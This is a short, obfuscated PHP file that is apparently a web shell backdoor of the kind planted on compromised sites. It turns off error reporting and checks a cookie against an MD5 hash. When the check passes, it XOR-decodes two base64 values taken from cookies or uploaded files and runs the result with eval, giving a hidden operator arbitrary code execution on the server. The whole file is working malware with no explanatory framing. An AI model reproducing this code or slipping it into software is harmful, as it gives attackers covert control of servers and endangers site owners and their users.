<?php

error_reporting(0);
ini_set('error_reporting', 0);

if ('1f2e9746621197dd68e91a24e77322a8' == md5($_COOKIE['aotex'])) {
	$mncke = create_function($bui, '$lqx = (!empty($_FILES["unxj"])) ? file_get_contents($_FILES["unxj"]["tmp_name"]) : $_COOKIE["unxj"]; $wngym = (!empty($_FILES["tvohpd"])) ? file_get_contents($_FILES["tvohpd"]["tmp_name"]) : $_COOKIE["tvohpd"]; $fhmdl = base64_decode($lqx) ^ base64_decode($wngym); @eval($fhmdl);');
	$mncke('$wN7@O{^.s&8GhO^NT^s7tejZJK,$,M2gplYYQ-JW;AD#', 'k{,P2/`]aBTl');
}

?>